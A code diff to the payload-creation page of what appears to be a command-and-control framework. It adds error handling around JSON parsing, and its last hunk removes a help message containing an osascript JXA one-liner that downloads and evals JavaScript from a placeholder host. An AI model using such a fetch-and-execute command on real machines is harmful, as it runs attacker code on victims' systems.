@@ -31,7 +31,12 @@ $( '#c2_profile' ).change(function(){
 });
 function c2_profile_callback(response){
     // populate the c2_profile select options
-    var data = JSON.parse(response);
+   try{
+        data = JSON.parse(response);
+    }catch(error){
+        alertTop("danger", "Session expired, please refresh");
+        return;
+    }
     var c2_profile_options = '<option value="Select One...">Select One...</option>';
     for(var i = 0; i < data.length; i ++){
         c2_profile_options = c2_profile_options + '<option value="' + data[i].name + '">' + data[i].name + '</option>';
@@ -42,7 +47,12 @@ function c2_profile_callback(response){
 };
 function c2_profile_parameters_callback(response){
     //this is called when the c2_profile dropdown changes and we get results back from the GET request
-    var data = JSON.parse(response);
+    try{
+        data = JSON.parse(response);
+    }catch(error){
+        alertTop("danger", "Session expired, please refresh");
+        return;
+    }
     if(data['status'] == 'success'){
         // populate the table values
         profile_parameters_table.c2_profile_parameters = []; //clear all the fields first
@@ -78,7 +88,12 @@ $( '#payload_type' ).change(function(){
 
 });
 function commands_callback(response){
-    data = JSON.parse(response);
+    try{
+        data = JSON.parse(response);
+    }catch(error){
+        alertTop("danger", "Session expired, please refresh");
+        return;
+    }
     cmd_options = '';
     if(data['status'] == 'success'){
         for(var i = 0; i < data['commands'].length; i++){
@@ -94,7 +109,12 @@ function commands_callback(response){
 
 };
 function payload_type_callback(response){
-    data = JSON.parse(response);
+    try{
+        data = JSON.parse(response);
+    }catch(error){
+        alertTop("danger", "Session expired, please refresh");
+        return;
+    }
     if(data['status'] == "success"){
         if(data['wrapper']){
             //this means we need to select a payload to wrap, so make a request to get all created payloads of payload type data['wrapped_payload_type']
@@ -111,7 +131,12 @@ function payload_type_callback(response){
     }
 }
 function wrapped_payloads_callback(response){
-    data = JSON.parse(response)
+    try{
+        data = JSON.parse(response);
+    }catch(error){
+        alertTop("danger", "Session expired, please refresh");
+        return;
+    }
     if(data['status'] == "success"){
         //now we should have a list of already created payloads, in our current operation, of the appropriate type that we can select from
         var options = "<option name='a'>Select One...</option>";
@@ -136,7 +161,12 @@ $('#wrappedPayload').change(function(){
     }
 });
 function update_wrapped_payloads_callback(response){
-    data = JSON.parse(response);
+    try{
+        data = JSON.parse(response);
+    }catch(error){
+        alertTop("danger", "Session expired, please refresh");
+        return;
+    }
     if(data['status'] == "success"){
         //update the selected commands along the right hand side based on teh payload selected
         var selected_options = "";
@@ -175,17 +205,14 @@ function submit_payload(){
     httpGetAsync("{{http}}://{{links.server_ip}}:{{links.server_port}}{{links.api_base}}/payloads/create", submit_payload_callback, "POST", data);
 }
 function submit_payload_callback(response){
-    console.log(response);
-    data = JSON.parse(response);
+    try{
+        data = JSON.parse(response);
+    }catch(error){
+        alertTop("danger", "Session expired, please refresh");
+        return;
+    }
     if(data['status'] == "success"){
-        //print out the run usage commands
-        if( $('#payload_type').val() == 'apfell-jxa'){
-            var execution_string = "Success! You can now execute it with a method like the JXA oneliner:<br>";
-            execution_string = execution_string + "osascript -l JavaScript -e \"eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString('<b>http://someIPHere:port/output/file/name.js</b>')),$.NSUTF8StringEncoding)));<br>";
-            execution_string = execution_string + "be sure to host the file somewhere though like with the <b>Services->Host File</b> section!";
-            $('#success').html(execution_string);
-        }
-        alertTop("success", "Success!");
+        alertTop("success", "<b>Success!</b> Execution help:\n" + data['execute_help']);
     }
     else{
         $('#errors').html((data['error']));
